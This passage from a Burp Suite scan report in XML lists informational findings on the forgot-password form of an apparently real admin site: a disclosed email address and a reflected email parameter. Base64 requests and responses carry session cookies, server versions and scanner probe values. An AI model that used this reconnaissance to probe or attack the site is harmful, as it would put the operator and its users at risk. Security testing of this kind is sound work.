    <remediationBackground><![CDATA[<p>Consider removing any email addresses that are unnecessary, or replacing personal addresses with anonymous mailbox addresses (such as helpdesk@example.com).</p>
<p>To reduce the quantity of spam sent to anonymous mailbox addresses, consider hiding the email address and instead providing a form that generates the email server-side, protected by a CAPTCHA if necessary. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure">Web Security Academy: Information disclosure</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following email address was disclosed in the response:<ul><li>tbhBBPKt@burpcollaborator.net</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[tbhBBPKt@burpcollaborator.net]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvZm9yZ290UGFzc3dvcmQgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPW5ubWZtcmdwa24za3V0aG4wYnNxbW9scDc4OyBzY3JlZW5XaWR0aD04MDA7IEFXU0FMQj1MM1lsa3lBdm95OGMrZFNhcHpBN3lLQ243djd1SUdoMUVvWDJJWXdBeVdwREY4T1ZISUtRRmxic0Uwd3ZKMnpvVnZONzVwT25SSGpDaUZEL2l3OXVuMUZUa3lhVzM5UkZNejkwWFhpMUs3MHQ2MDBIL3JoUWFoU1BmV1RwOyBBV1NBTEJDT1JTPUwzWWxreUF2b3k4YytkU2FwekE3eUtDbjd2N3VJR2gxRW9YMklZd0F5V3BERjhPVkhJS1FGbGJzRTB3dkoyem9Wdk43NXBPblJIakNpRkQvaXc5dW4xRlRreWFXMzlSRk16OTBYWGkxSzcwdDYwMEgvcmhRYWhTUGZXVHANCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9mb3Jnb3RQYXNzd29yZA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNTkNCg0KZW1haWw9dGJoQkJQS3QlNDBidXJwY29sbGFib3JhdG9yLm5ldCZhY3Rpb249Zm9yZ290UGFzc3dvcmQ=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo0Mjo0NyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNDQ2NA0KU2V0LUNvb2tpZTogQVdTQUxCPUhmWE1QWXBVRXRDUXFseXlSQ0pjYjV5aGN5ZkxXTVdVa0FHSUJ5S0RDSm1vS0Rnclk1bktFNG96TFI0U3BjOEVYMW54UW1DNVhNTW12WnVNSG5FMFRaNExtNjJERWxBRUZ6R0dkVzVvbk5oZGN3cFdZc3Z3STN6d0dDT3g7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo0Mjo0NyBHTVQ7IFBhdGg9Lw0KU2V0LUNvb2tpZTogQVdTQUxCQ09SUz1IZlhNUFlwVUV0Q1FxbHl5UkNKY2I1eWhjeWZMV01XVWtBR0lCeUtEQ0ptb0tEZ3JZNW5LRTRvekxSNFNwYzhFWDFueFFtQzVYTU1tdlp1TUhuRTBUWjRMbTYyREVsQUVGekdHZFc1b25OaGRjd3BXWXN2d0kzendHQ094OyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NDI6NDcgR01UOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZQ0KU2VydmVyOiBBcGFjaGUvMi40LjUyICgpIFBIUC84LjIuOQ0KWC1Qb3dlcmVkLUJ5OiBQSFAvOC4yLjkNCkV4cGlyZXM6IFRodSwgMTkgTm92IDE5ODEgMDg6NTI6MDAgR01UDQpDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KDQo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICA8dGl0bGU+TWlyYWRvciBJbnNpZ2h0czwvdGl0bGU+CiAgICAgICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJNaXJhZG9yIEhlYWx0aCI+CiAgICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIG1heGltdW0tc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIiAvPgogICAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvaWNvIiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9mYXZpY29uLmljbyIvPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL3NlbGVjdDIubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9kYXRlcmFuZ2VwaWNrZXIuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnRhd2Vzb21lLWZyZWUtYWxsLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvZGF0YVRhYmxlcy5ib290c3RyYXA0LmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9yZXNwb25zaXZlLmJvb3RzdHJhcDQuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2J1dHRvbnMuYm9vdHN0cmFwNC5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvYWRtaW5sdGUubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2Jvb3RzdHJhcC1kYXRlcGlja2VyLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvbWFpbi5jc3M/dj1mNzJkNDIiPgoKICAgICAgICA8c2NyaXB0PnZhciBhY3RpdmVUaGVtZSA9ICdsaWdodCc8L3NjcmlwdD4gICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvbWFpbi1saWdodC5jc3M/dj1mNzJkNDIiPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vZm9udHMvc3R5bGVzaGVldC5jc3MiPgogICAgICAgIDxzY3JpcHQ+CiAgICAgICAgICAgIGRvY3VtZW50LmNvb2tpZSA9ICJzY3JlZW5XaWR0aD0iK3NjcmVlbi53aWR0aCsiOzMwO3BhdGg9LyI7CiAgICAgICAgPC9zY3JpcHQ+CiAgICA8L2hlYWQ+CiAgICA8Ym9keSBjbGFzcz0ibG9naW4tcGFnZSI+CiAgICAgICAgPGRpdiBjbGFzcz0ibG9naW4tYm94Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxvZ2luLWxvZ28iIHN0eWxlPSJtYXJnaW4tdG9wOiAwLjZyZW07Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBjbGFzcz0idy03NSIgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9taXJhZG9yX2luc2lnaHRzX2xvZ28ucG5nIiAvPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJsb2dpbi1ib3gtbXNnIj5Gb3Jnb3QgUGFzc3dvcmQ8L3A+CgogICAgICAgICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcmdvdFBhc3N3b3JkIiBuYW1lPSJmb3Jnb3RQYXNzd29yZCIgY2xhc3M9Im1iLTAiIG9uc3VibWl0PSJyZXR1cm4gdmFsaWRhdGVGb3Jnb3RQYXNzd29yZCgpIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gaWQ9ImVtYWlsRXJyIiBjbGFzcz0iaW52YWxpZC1mZWVkYmFjayBkLWJsb2NrIj5FbWFpbCBkb2VzIG5vdCBleGlzdC48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtYmxvY2siPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgbWItMyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IG5hbWU9ImVtYWlsIiBpZD0iZW1haWwiIHR5cGU9ImVtYWlsIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iRW1haWwiIHZhbHVlPSJ0YmhCQlBLdEBidXJwY29sbGFib3JhdG9yLm5ldCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtYXBwZW5kIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtdGV4dCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iZmFzIGZhLWVudmVsb3BlIj48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgcm93LWVxLWhlaWdodCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTgiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkLWZsZXggaC0xMDAgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4iPkJhY2sgdG8gbG9naW48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC00Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0iZm9yZ290UGFzc3dvcmQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGFyayBidG4tYmxvY2siPlN1Ym1pdDwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvdmFsaWRhdGlvbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdD4KICAgICAgICBmdW5jdGlvbiB2YWxpZGF0ZUZvcmdvdFBhc3N3b3JkKCkgewogICAgICAgICAgICB2YXIgZW1haWxFcnIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZW1haWxFcnIiKTsKICAgICAgICAgICAgdmFyIGVtYWlsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImVtYWlsIikudmFsdWUudHJpbSgpOwogICAgICAgICAgICBlbWFpbEVyci5pbm5lckhUTUwgPSAnJzsKCiAgICAgICAgICAgIGlmICghdmFsaWRhdGVFbWFpbChlbWFpbCkpIHsKICAgICAgICAgICAgICAgIGVtYWlsRXJyLmlubmVySFRNTCA9ICdQbGVhc2UgZW50ZXIgdmFsaWQgZW1haWwgYWRkcmVzcy4nOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICA8L3NjcmlwdD4KICAgIDwvYm9keT4KPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7682127085766612992</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/forgotPassword]]></path>
    <location><![CDATA[/forgotPassword [email parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the <b>email</b> request parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvZm9yZ290UGFzc3dvcmQgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWN1dHFrNG5wN2c1a2ZrY2Rlajk3cDVlcnEzOyBzY3JlZW5XaWR0aD04MDA7IEFXU0FMQj1aeVorM2hUVWZqWjJQTVpqQXIrSHFxWGdsMWVoVGQ0WE5uT3I0RWZzTG9PcEJaVWNpRHlEQnF5YWlBaWhaanluMTBpNUs5cnpSaXpZMXRVTUpMb20wMDkvNzNQRVp5VS9GenpRU0pjNzIvRnRCVS8zUkxjU0VYYkwyWHo3OyBBV1NBTEJDT1JTPVp5WiszaFRVZmpaMlBNWmpBcitIcXFYZ2wxZWhUZDRYTm5PcjRFZnNMb09wQlpVY2lEeURCcXlhaUFpaFpqeW4xMGk1SzlyelJpelkxdFVNSkxvbTAwOS83M1BFWnlVL0Z6elFTSmM3Mi9GdEJVLzNSTGNTRVhiTDJYejcNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9mb3Jnb3RQYXNzd29yZA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNTkNCg0KZW1haWw9dGJoQkJQS3RAYnVycGNvbGxhYm9yYXRvci5uZXQwNGRtZ2FtbGVwJmFjdGlvbj1mb3Jnb3RQYXNzd29yZA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo0MzoxMyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNDQ3NA0KU2V0LUNvb2tpZTogQVdTQUxCPUt4Y1RKZEFuZlZEVjExS2t6WkxGeDFWZkw1bWxtSTQ3NGtpTEdCVHlQY095VDJ6NTVkaHlGU3BabUNBWkkwMnlORjdnWUlFemJHdkh6bUJ5MWVjclJXdndHaWZJcXh2bEdOeE0rMEIvL2svUHBNV2YwblRNNjR1aXRsZTY7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo0MzoxMyBHTVQ7IFBhdGg9Lw0KU2V0LUNvb2tpZTogQVdTQUxCQ09SUz1LeGNUSmRBbmZWRFYxMUtrelpMRngxVmZMNW1sbUk0NzRraUxHQlR5UGNPeVQyejU1ZGh5RlNwWm1DQVpJMDJ5TkY3Z1lJRXpiR3ZIem1CeTFlY3JSV3Z3R2lmSXF4dmxHTnhNKzBCLy9rL1BwTVdmMG5UTTY0dWl0bGU2OyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NDM6MTMgR01UOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZQ0KU2VydmVyOiBBcGFjaGUvMi40LjUyICgpIFBIUC84LjIuOQ0KWC1Qb3dlcmVkLUJ5OiBQSFAvOC4yLjkNCkV4cGlyZXM6IFRodSwgMTkgTm92IDE5ODEgMDg6NTI6MDAgR01UDQpDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KDQo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICA8dGl0bGU+TWlyYWRvciBJbnNpZ2h0czwvdGl0bGU+CiAgICAgICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJNaXJhZG9yIEhlYWx0aCI+CiAgICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIG1heGltdW0tc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIiAvPgogICAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvaWNvIiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9mYXZpY29uLmljbyIvPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL3NlbGVjdDIubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9kYXRlcmFuZ2VwaWNrZXIuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnRhd2Vzb21lLWZyZWUtYWxsLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvZGF0YVRhYmxlcy5ib290c3RyYXA0LmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9yZXNwb25zaXZlLmJvb3RzdHJhcDQuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2J1dHRvbnMuYm9vdHN0cmFwNC5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvYWRtaW5sdGUubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2Jvb3RzdHJhcC1kYXRlcGlja2VyLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvbWFpbi5jc3M/dj1mNzJkNDIiPgoKICAgICAgICA8c2NyaXB0PnZhciBhY3RpdmVUaGVtZSA9ICdsaWdodCc8L3NjcmlwdD4gICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvbWFpbi1saWdodC5jc3M/dj1mNzJkNDIiPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vZm9udHMvc3R5bGVzaGVldC5jc3MiPgogICAgICAgIDxzY3JpcHQ+CiAgICAgICAgICAgIGRvY3VtZW50LmNvb2tpZSA9ICJzY3JlZW5XaWR0aD0iK3NjcmVlbi53aWR0aCsiOzMwO3BhdGg9LyI7CiAgICAgICAgPC9zY3JpcHQ+CiAgICA8L2hlYWQ+CiAgICA8Ym9keSBjbGFzcz0ibG9naW4tcGFnZSI+CiAgICAgICAgPGRpdiBjbGFzcz0ibG9naW4tYm94Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxvZ2luLWxvZ28iIHN0eWxlPSJtYXJnaW4tdG9wOiAwLjZyZW07Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBjbGFzcz0idy03NSIgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9taXJhZG9yX2luc2lnaHRzX2xvZ28ucG5nIiAvPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJsb2dpbi1ib3gtbXNnIj5Gb3Jnb3QgUGFzc3dvcmQ8L3A+CgogICAgICAgICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcmdvdFBhc3N3b3JkIiBuYW1lPSJmb3Jnb3RQYXNzd29yZCIgY2xhc3M9Im1iLTAiIG9uc3VibWl0PSJyZXR1cm4gdmFsaWRhdGVGb3Jnb3RQYXNzd29yZCgpIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gaWQ9ImVtYWlsRXJyIiBjbGFzcz0iaW52YWxpZC1mZWVkYmFjayBkLWJsb2NrIj5FbWFpbCBkb2VzIG5vdCBleGlzdC48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtYmxvY2siPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgbWItMyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IG5hbWU9ImVtYWlsIiBpZD0iZW1haWwiIHR5cGU9ImVtYWlsIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iRW1haWwiIHZhbHVlPSJ0YmhCQlBLdEBidXJwY29sbGFib3JhdG9yLm5ldDA0ZG1nYW1sZXAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwLWFwcGVuZCI+CiAgICAgICAgICAgICAgICAg